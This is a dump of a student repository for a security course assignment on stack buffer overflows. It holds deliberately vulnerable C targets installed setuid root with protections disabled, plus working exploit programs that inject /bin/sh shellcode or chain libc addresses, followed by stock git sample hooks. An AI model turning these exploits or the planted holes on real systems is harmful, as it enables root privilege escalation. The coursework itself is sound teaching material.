<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

<<<<<<< HEAD
#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[424];
  memset(buf, 0x90, 424);
  memcpy(buf+200, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 412);
  *addr_ptr++ = 0xffffcf5c;
  *addr_ptr++ = 0xffffcf5c;  
  *addr_ptr++ = 0xffffcf5c;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit1</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit0</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit2</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/main

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
Initial commit of project files

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
